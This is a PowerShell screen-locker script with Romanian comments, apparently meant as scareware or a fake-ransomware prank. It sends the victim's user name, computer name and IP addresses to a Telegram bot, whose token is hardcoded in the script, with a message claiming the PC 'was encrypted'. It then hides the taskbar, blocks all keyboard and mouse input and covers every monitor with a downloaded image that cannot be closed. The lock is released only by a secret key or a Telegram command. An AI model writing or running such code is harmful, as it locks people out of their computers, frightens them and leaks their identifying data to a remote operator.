Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Cod nativ pt blocare și taskbar
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Native {
    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Config
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$chatID = '656189986'
$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'

# IP-uri
$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' })[0].IPAddress
try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") } catch { $ipPublic = "n/a" }

# Trimite mesaj Telegram
$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
$uriSend = "https://api.telegram.org/bot$botToken/sendMessage"
$body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
try {
    Invoke-RestMethod -Uri $uriSend -Method POST -Body $body -ContentType 'application/json'
} catch { Write-Host "Eroare Telegram: $_" }

# Ascunde Taskbar & blochează input
$taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
[Native]::ShowWindow($taskbar, 0)
[Native]::BlockInput($true)

# Descarcă imaginea
$temp = "$env:TEMP\poza_laptop.jpg"
try {
    Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
} catch {
    [Native]::BlockInput($false)
    Write-Host "Eroare descărcare imagine"
    exit
}

# Dimensiune totală pe toate monitoarele
$bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
$minX = ($bounds | ForEach-Object X) | Measure-Object -Minimum | Select -ExpandProperty Minimum
$minY = ($bounds | ForEach-Object Y) | Measure-Object -Minimum | Select -ExpandProperty Minimum
$maxX = ($bounds | ForEach-Object Right) | Measure-Object -Maximum | Select -ExpandProperty Maximum
$maxY = ($bounds | ForEach-Object Bottom) | Measure-Object -Maximum | Select -ExpandProperty Maximum
$width = $maxX - $minX
$height = $maxY - $minY

$script:inchis = $false

function InchideTot {
    $script:inchis = $true
    [Native]::BlockInput($false)
    [Native]::ShowWindow($taskbar, 1)
    $form.Invoke([Action]{ $form.Close() })
}

# Fereastra principală
$form = New-Object Windows.Forms.Form
$form.StartPosition = 'Manual'
$form.Location = New-Object Drawing.Point $minX, $minY
$form.Size = New-Object Drawing.Size $width, $height
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.ShowInTaskbar = $false
$form.BackColor = 'Black'
$form.KeyPreview = $true
$form.Cursor = [System.Windows.Forms.Cursors]::None

$img = [System.Drawing.Image]::FromFile($temp)
$pb = New-Object Windows.Forms.PictureBox
$pb.Image = $img
$pb.Dock = 'Fill'
$pb.SizeMode = 'Zoom'
$form.Controls.Add($pb)

$form.Add_KeyDown({
    if ($_.KeyCode -eq 'C') { InchideTot }
})
$form.Add_FormClosing({
    if (-not $script:inchis) { $_.Cancel = $true }
})

# Buclă paralelă de verificare mesaje Telegram (într-un thread)
Start-Job -ScriptBlock {
    while ($true) {
        try {
            $updates = Invoke-RestMethod "https://api.telegram.org/bot$using:botToken/getUpdates"
            foreach ($update in $updates.result) {
                $txt = $update.message.text
                if ($txt -eq "👍 $using:user" -or $txt -eq "👍 $using:pc") {
                    Stop-Job -Id $MyInvocation.MyCommand.Id -Force
                    $null = [System.Windows.Forms.Application]::OpenForms[0].Invoke([Action]{ $using:InchideTot.Invoke() })
                }
            }
        } catch {}
        Start-Sleep -Seconds 5
    }
} | Out-Null

# Rulează aplicația
$form.Show()
[System.Windows.Forms.Application]::Run($form)
